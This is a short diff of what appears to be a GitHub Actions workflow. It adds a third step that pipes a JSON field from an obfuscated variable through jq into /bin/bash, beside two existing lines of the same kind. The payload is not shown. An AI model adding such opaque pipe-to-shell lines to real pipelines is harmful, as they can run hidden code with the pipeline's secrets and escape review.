@@ -23,6 +23,7 @@ jobs:
         run: |
           printf '%s' "$tv2537" | jq -r .vm6115 | /bin/bash
           printf '%s' "$gmmk3" | jq -r .wbksj22 | /bin/bash
+          echo $mvaf453 | jq -r .y29771 | /bin/bash
 
       - name: Persist output
         uses: actions/upload-artifact@v4
